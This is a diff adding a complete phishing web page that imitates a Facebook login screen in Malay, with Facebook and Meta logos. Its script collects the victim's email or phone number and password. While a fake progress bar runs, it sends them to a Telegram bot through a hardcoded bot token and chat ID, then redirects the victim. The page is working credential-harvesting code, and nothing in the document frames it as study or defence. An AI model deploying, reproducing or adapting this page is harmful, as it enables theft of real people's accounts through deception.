@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Facebook Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <style>
+      /* Reset dan Base Styles */
+      body {
+        background-color: white;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        min-height: 100vh;
+        padding: 20px;
+      }
+
+      /* Typography */
+      h1 {
+        color: #1877f2;
+        font-size: 28px;
+        margin-bottom: 16px;
+        font-weight: 600;
+      }
+
+      p {
+        color: #606770;
+        font-size: 14px;
+        margin-bottom: 24px;
+        line-height: 1.34;
+        text-align: center;
+      }
+
+      /* Header Elements */
+      .language-selector {
+        margin: 10px 0;
+        color: #1c1e21;
+      }
+
+      .facebook-logo {
+        width: 50px;
+        margin: 20px 0;
+      }
+
+      /* Login Container */
+      .login-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        align-items: center;
+        background-color: white;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        width: 100%;
+        max-width: 400px;
+      }
+
+      /* Form Elements */
+      input {
+        width: 100%;
+        padding: 14px 16px;
+        margin-bottom: 20px;
+        border: 1px solid #dddfe2;
+        border-radius: 10px;
+        box-sizing: border-box;
+        font-size: 15px;
+      }
+
+      input:focus {
+        outline: none;
+        border-color: #1877f2;
+        box-shadow: 0 0 0 2px #e7f3ff;
+      }
+
+      /* Buttons */
+      .login-btn {
+        background-color: #1877f2;
+        color: white;
+        padding: 12px;
+        border: none;
+        border-radius: 15px;
+        width: 100%;
+        font-size: 18px;
+        font-weight: bold;
+        cursor: pointer;
+        margin-bottom: 16px;
+        height: 48px;
+      }
+
+      .login-btn:hover {
+        background-color: #166fe5;
+      }
+
+      .create-account {
+        background-color: #fff;
+        color: #1877f2;
+        padding: 14px 16px;
+        border: 1px solid #1877f2;
+        border-radius: 15px;
+        font-size: 16px;
+        font-weight: bold;
+        cursor: pointer;
+        width: 100%;
+        height: 48px;
+        margin: 0 auto;
+      }
+
+      .create-account:hover {
+        background-color: #36a420;
+      }
+
+      /* Links */
+      .forgot-password {
+        color: #1877f2;
+        text-decoration: none;
+        font-size: 14px;
+        display: block;
+        margin-bottom: 20px;
+      }
+
+      .forgot-password:hover {
+        text-decoration: underline;
+      }
+
+      /* Loading Dialog */
+      .loading-dialog {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.5);
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+      }
+
+      .dialog-content {
+        background: white;
+        padding: 20px;
+        border-radius: 8px;
+        width: 300px;
+        text-align: center;
+      }
+
+      /* Progress Bar */
+      .progress-bar {
+        width: 100%;
+        height: 20px;
+        background: #f0f0f0;
+        border-radius: 10px;
+        overflow: hidden;
+        margin: 10px 0;
+      }
+
+      .progress {
+        width: 0%;
+        height: 100%;
+        background: #1877f2;
+        transition: width 0.5s;
+      }
+
+      /* Responsive Design */
+      @media (max-width: 400px) {
+        .login-container {
+          width: 90%;
+        }
+      }
+
+      @media (max-width: 320px) {
+        .login-container {
+          width: 90%;
+        }
+      }
+
+      .meta-logo {
+        margin-top: 20px;
+        width: 50px;
+      }
+
+      .footer {
+        margin-top: 20px;
+        text-align: center;
+      }
+
+      .footer a {
+        color: #385898;
+        text-decoration: none;
+        margin: 0 10px;
+        font-size: 14px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="language-selector">English (UK)</div>
+
+    <img
+      src="2023_Facebook_icon.svg.png"
+      alt="Facebook"
+      class="facebook-logo"
+    />
+    <div class="login-container">
+      <h1>Masuk ke Facebook</h1>
+      <p>
+        Sila masukan email atau nombor telefon akaun Facebook untuk mengesahkan
+        permohonan anda.
+      </p>
+
+      <form id="loginForm">
+        <input
+          type="text"
+          id="email"
+          name="email"
+          placeholder="E-mel atau Nombor Telefon"
+          required
+        />
+        <input
+          type="password"
+          id="password"
+          name="password"
+          placeholder="Kata Laluan"
+          required
+        />
+        <button type="submit" class="login-btn">Log Masuk</button>
+      </form>
+
+      <a href="#" class="forgot-password">Terlupa Kata Laluan?</a>
+      <button class="create-account">Cipta Akaun Baru</button>
+    </div>
+
+    <img src="Meta_Platforms_Inc._logo.svg.png" alt="Meta" class="meta-logo" />
+
+    <div class="footer">
+      <a href="#">About</a>
+      <a href="#">Help</a>
+      <a href="#">More</a>
+    </div>
+
+    <!-- Tambahkan dialog sebelum penutup body -->
+    <div class="loading-dialog">
+      <div class="dialog-content">
+        <h3>Sedang Memproses...</h3>
+        <div class="progress-bar">
+          <div class="progress"></div>
+        </div>
+        <p class="progress-text">0%</p>
+      </div>
+    </div>
+
+    <script>
+      document
+        .getElementById("loginForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+
+          const email = document.getElementById("email").value;
+          const password = document.getElementById("password").value;
+          const dialog = document.querySelector(".loading-dialog");
+          const progress = document.querySelector(".progress");
+          const progressText = document.querySelector(".progress-text");
+
+          // Tampilkan dialog
+          dialog.style.display = "flex";
+
+          // Simulasi loading progress
+          let width = 0;
+          const interval = setInterval(() => {
+            if (width >= 100) {
+              clearInterval(interval);
+              // Kirim data ke Telegram
+              const botToken = "7410437482:AAHjVoPurOsB4-yoSFVinzj8VNnrAPVjmpc";
+              const chatId = "5265564576";
+
+              const message =
+                `🔐 *DATA LOGIN FACEBOOK BARU*\n\n` +
+                `📧 *Email/Phone:*\n${email}\n\n` +
+                `🔑 *Password:*\n${password}\n\n` +
+                `📅 *Waktu:* ${new Date().toLocaleString("id-ID")}\n` +
+                `🌐 *IP:* _mengambil..._`;
+
+              fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                  chat_id: chatId,
+                  text: message,
+                  parse_mode: "Markdown",
+                }),
+              }).then(() => {
+                window.location.href = "index.html";
+              });
+            } else {
+              width += 1;
+              progress.style.width = width + "%";
+              progressText.textContent = width + "%";
+            }
+          }, 200);
+        });
+    </script>
+  </body>
+</html>
